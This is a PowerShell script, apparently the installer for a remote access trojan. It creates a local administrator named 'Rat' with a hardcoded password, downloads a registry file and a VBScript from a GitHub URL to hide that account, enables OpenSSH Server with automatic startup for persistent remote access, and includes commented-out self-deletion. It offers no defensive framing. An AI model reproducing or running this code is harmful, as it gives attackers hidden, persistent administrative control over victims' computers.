#builds resources
#

#random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
    }

# create local admin for rat 
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end {     
    }
}
#name and pass
$NewLocalAdmin = "Rat"
$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#variable
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# go to temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-reg.reg -Outfile "reg.reg"

# visual basic script to regiser the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-script.vbs -Outfile "script.vbs"

# install the registry
#./reg.reg;./script.vbs

# enabling persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Serivce -Name sshd -StartupType 'Automatic'

# delete self
cd $initial_dir
# del installer.ps1
